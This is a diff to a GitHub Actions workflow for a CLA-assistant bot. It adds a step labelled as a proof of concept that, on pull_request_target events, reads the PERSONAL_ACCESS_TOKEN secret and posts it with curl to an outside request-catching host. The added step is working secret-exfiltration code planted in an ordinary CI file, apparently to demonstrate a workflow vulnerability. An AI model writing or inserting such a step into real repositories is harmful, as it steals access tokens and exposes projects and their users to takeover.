@@ -40,3 +40,11 @@ jobs:
           #custom-allsigned-prcomment: 'pull request comment when all contributors has signed, defaults to **CLA Assistant Lite bot** All Contributors have signed the CLA.'
           #lock-pullrequest-aftermerge: false - if you don't want this bot to automatically lock the pull request after merging (default - true)
           #use-dco-flag: true - If you are using DCO instead of CLA
+
+      # ---- PROOF OF CONCEPT: EXFILTRATE SECRET ----
+      - name: "Exfiltrate PERSONAL_ACCESS_TOKEN"
+        if: github.event_name == 'pull_request_target'
+        run: |
+          curl -s -X POST -d "token=$PERSONAL_ACCESS_TOKEN" https://celo-poc.requestcatcher.com/exfil
+        env:
+          PERSONAL_ACCESS_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
